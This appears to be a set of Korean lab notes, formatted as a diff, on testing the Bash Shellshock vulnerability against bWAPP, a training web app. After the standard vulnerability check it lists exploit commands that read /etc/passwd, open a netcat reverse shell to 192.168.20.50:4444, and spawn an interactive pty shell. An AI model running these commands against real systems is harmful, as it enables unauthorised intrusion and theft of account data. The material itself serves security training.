@@ -1,0 +1,35 @@
+1. Bash Shellshock 취약점
+
+ 1) Bash Shellshock 취약점이 없는 경우
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+
+ 2) Bash Shellshock 취약점이 있는 경우
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+
+
+2. bWAPP Bash Shellshock 취약점 진단
+
+ 1) Bash Shellshock 취약점 진단
+
+env x='() { :;}; echo vulnerable' bash -c "echo test"
+
+
+ 2) Bash Shellshock 취약점을 이용한 계정 정보 확인
+
+env x='() { :;}; cat /etc/passwd' bash -c "echo test"
+
+
+ 3) Bash Shellshock 취약점을 이용한 Reverse TCP 연결
+
+ ③ 
+
+env x='() { :;}; nc -e /bin/bash 192.168.20.50 4444' bash -c "echo test"  
+
+
+ ④ 
+
+python -c 'import pty;pty.spawn("/bin/bash")'
